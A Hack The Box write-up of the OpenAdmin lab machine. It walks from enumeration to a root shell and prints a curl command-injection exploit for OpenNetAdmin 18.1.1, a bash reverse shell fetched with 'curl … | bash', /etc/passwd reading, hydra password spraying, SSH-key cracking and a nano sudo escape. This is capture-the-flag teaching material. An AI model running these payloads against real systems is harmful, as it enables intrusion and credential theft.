---
layout: post
title: "Hack The Box - OpenAdmin Writeup"
author: Chr0x6eOs
date: "2020-05-02"
subject: "OpenAdmin Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Linux]
lang: "en"
titlepage: true
image:
    path: /assets/htb/OpenAdmin/openadmin.png
    width: 500
    height: 500
...

# Overview
![OpenAdmin Image](/assets/htb/OpenAdmin/openadmin.png)

[OpenAdmin](https://www.hackthebox.eu/home/machines/profile/222) is an easy linux box by [dmw0ng](https://www.hackthebox.eu/home/users/profile/82600).


The box starts with web-enumeration, which reveals an old version of the software OpenNetAdmin. This version is vulnerable to a remote-code-execution exploit. This gives us code-execution in the context of the user www-data. After finding a clear-text password in the config file OpenNetAdmin, we can login via ssh. Checking the listening ports, an internal website is revealed. The website is protected with a login, however the password is hardcoded. Logging in to the website reveals a password-protected SSH-key. After cracking the passphrase for the ssh-key we can login and read user.txt.
In order to get root we have to abuse sudo privileges for the nano binary.

# Information Gathering

## Nmap
We begin our enumeration by running Nmap to find open ports and enumerate services.

```console
root@silence:~# nmap -sC -sV 10.10.10.171
Nmap scan report for 10.10.10.171
Host is up (0.039s latency).
Not shown: 998 closed ports
PORT   STATE    SERVICE VERSION
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Enumeration
The only two open ports shown are **22** and **80**. SSH usually is not that interesting, so let's begin with http.

## HTTP - Port 80
Going to https://10.10.10.171 the default apache2 page is shown. To further enumerate the website, we'll start a gobuster.

```console
root@silence:~# gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.171
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/02 14:01:26 Starting gobuster
===============================================================
/music (Status: 301)
```
Immediately after starting the gobuster we get a result returned.
Going to /music this webpage is shown:

![/music webpage](/assets/htb/OpenAdmin/webpage-music.png)
Checking out the links, "Login" redirects to http://10.10.10.171/ona:

![OpenAdmin webpage](/assets/htb/OpenAdmin/webpage-ona.png)
The website title suggests, that this website is running a software called "OpenNetAdmin". Furthermore, there is an alert, telling us, that the current version of this website (v18.1.1) is out of date.

# Initial Shell - Exploiting OpenNetAdmin
## Finding RCE exploit
Running searchsploit, a RCE (remote code execution) exploit is found:

```console
root@silence:~# searchsploit "OpenNetAdmin"
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
OpenNetAdmin 13.03.01 - Remote Code Execution                                | exploits/php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                 | exploits/php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                  | exploits/php/webapps/47691.sh
----------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
The last exploit seems to match the version of the current deployed OpenNetAdmin, so we'll check this one out first.

```console
root@silence:~# cat rce.sh
#!/bin/bash

URL="http://10.10.10.171/ona/"
while true;
do
         echo -n "$ "; read cmd
         curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;
         echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" |
         sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
Seems like there is a command injection in one of the post parameters.

## Getting a shell as www-data
```console
root@silence:~# ./rse.sh
$ whoami
www-data
```
Running the exploit, we can verify code-execution by issuing a simple "whoami". Seems like we have code-execution in the context of the user "www-data". Let's get a shell next!

In order to evade bad characters and other issues, I am going to host the reverse shell with a python webserver and use the RCE to access and execute my payload.

```console
root@silence:~# cat s.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'
```
This simple bash reverse-shell should do the trick.

```console
root@silence:~# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
With the webserver up and running we now just need to access and execute the reverse-shell using the exploit.

```console
root@silence:~# ./rce.sh
$ which curl
/usr/bin/curl
$ curl 10.10.14.7/s.sh | bash
```
With curl being installed, we can simply access the reverse-shell and directly pipe it into bash to execute it.

`10.10.10.171 - - [02/May/2020 14:36:59] "GET /s.sh HTTP/1.1" 200 -`

The reverse-shell is being accessed from the python webserver.

```console
root@silence:~# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.171.
Ncat: Connection from 10.10.10.171:39448.
bash: cannot set terminal process group (1049): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$
```
We got the shell returned! Next up let's enumerate the system.

# Privesc
## Enumeration as www-data
After a bit of searching around, an interesting config file can be found at /opt/ona/www/local/config/database_settings.inc.php :
```php
<?php

$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' =>
    array (
      0 =>
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
?>
```
Now having found a password, we need a user to login with.

Checking out /etc/passwd for possible users to log in to:
```console
www-data@openadmin:/opt/ona/www/local/config$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```
Seems like we have 3 possible users (actually 2, because root is rather unlikely) we can try to authenticate with the found password.

## Privesc to jimmy
Of course we could try to su with our current reverse-shell, however Port 22 is open, so let's try SSH first. If this succeeds we get a much more stable shell and have some additional features like portforwarding or copying via scp.

```console
root@silence:~# cat users.txt
root
jimmy
joanna
root@silence:~# hydra -L users.txt -p 'n1nj4W4rri0R!' ssh://10.10.10.171
[DATA] attacking ssh://10.10.10.171:22/
[22][ssh] host: 10.10.10.171   login: jimmy   password: n1nj4W4rri0R!
1 of 1 target successfully completed, 1 valid password found
```
Using hydra we can quickly evaluate if any of the users on the system are allowed to login with the found password.
Jimmy seems to be allowed to login via ssh with the password 'n1nj4W4rri0R!'.

```console
ssh jimmy@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts.
jimmy@10.10.10.171's password: n1nj4W4rri0R!

Last login: Thu Jan  2 20:50:03 2020 from 10.10.14.3
jimmy@openadmin:~$
```

## Privesc to joanna
As there was no user.txt found in the home directory of jimmy, the next step is to escalate privileges to joanna.
### Enumerating ports
```console
jimmy@openadmin:~$ netstat -alnp | grep "LISTEN "
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
```
Checking out all the ports listening on localhost only, the port **52846** stands out in particular.

We can simply verify what's running on the port, by connecting to it via nc and sending some junk data:
```console
jimmy@openadmin:~$ nc 127.0.0.1 52846
Test
HTTP/1.1 400 Bad Request
Date: Sat, 02 May 2020 13:06:30 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 314
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at internal.openadmin.htb Port 80</address>
</body></html>
```
This response is really valuable, as it gives us a lot of information. We now know that on 52846 an Apache webserver is running and the hostname is _internal.openadmin.htb_.

As we have the possibility to login via SSH, we can portforward the http-traffic through the SSH-tunnel to the port and browse the page normally.

### Portforwaring via SSH
```console
ssh jimmy@10.10.10.171 -L 80:127.0.0.1:52846
jimmy@10.10.10.171's password: n1nj4W4rri0R!
jimmy@openadmin:~$
```
We can verify the tunnel by checking our listening ports:
```console
netstat -alnp | grep "LISTEN "
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      23457/ssh
```
Seems like the tunnel is working! Let's browse the website.

![Internal webpage](/assets/htb/OpenAdmin/webpage-internal.png)

The login is password-protected and the found credentials (jimmy:n1nj4W4rri0R!) do not work...
With a shell on the server, let's check if we can access the source of this website.
```console
jimmy@openadmin:/var/www$ ls -alh
total 16K
drwxr-xr-x  4 root     root     4.0K Nov 22 18:15 .
drwxr-xr-x 14 root     root     4.0K Nov 21 14:08 ..
drwxr-xr-x  6 www-data www-data 4.0K Nov 22 15:59 html
drwxrwx---  2 jimmy    internal 4.0K Nov 23 17:43 internal
lrwxrwxrwx  1 www-data www-data   12 Nov 21 16:07 ona -> /opt/ona/www
jimmy@openadmin:/var/www$ cd internal
jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
```
Seems like we can indeed access the source code to internal...
Checking out index.php:
```php
<h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';
            if (isset($_POST['login'])
            && !empty($_POST['username'])
            && !empty($_POST['password']))
            {
              if ($_POST['username'] == 'jimmy'
              && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1')
              {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div>
```
Seems like the password is hardcoded! Let's use google and check if this hash is known...

The password is "Revealed", as found [here](https://md5hashing.net/hash/sha512/00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1).

Using the creds (jimmy:Revealed), we can login successfully.

![Internal main webpage](/assets/htb/OpenAdmin/webpage-internal-main.png)
### Cracking SSH private key
The RSA private key seems interesting, so we'll save it to a file.

Using john we can extract and crack the hash of the rsa private-key:
```console
root@silence:~# ssh2john joanna.key > joanna-key.hash
root@silence:~# john joanna-key.hash --wordlist=/usr/share/wordlists/rockyou.txt
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
bloodninjas      (joanna.key)
```
With the password for the SSH-key cracked we can finally login via SSH and hopefully get user.txt:
```console
ssh -i joanna.key joanna@10.10.10.171
Enter passphrase for key 'joanna.key': bloodninjas
Last login: Thu Jan  2 21:12:40 2020 from 10.10.14.3
joanna@openadmin:~$ cat user.txt
c9b2c***************************
```

## Privesc to root
Checking the sudo privileges of joanna we have our privilege escalation path:
```console
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
Checking out [GTFObins](https://gtfobins.github.io/gtfobins/nano/#shell), we have a quick way to get a shell as root.
![GTFObin nano](/assets/htb/OpenAdmin/gtfobin-nano.png)

```console
joanna@openadmin:~$ sudo nano /opt/priv
```

![Privesc part 1](/assets/htb/OpenAdmin/privesc-nano1.png)
![Privesc part 2](/assets/htb/OpenAdmin/privesc-nano2.png)

Now we can read root.txt:
```console
# cat root.txt
2f907***************************
```
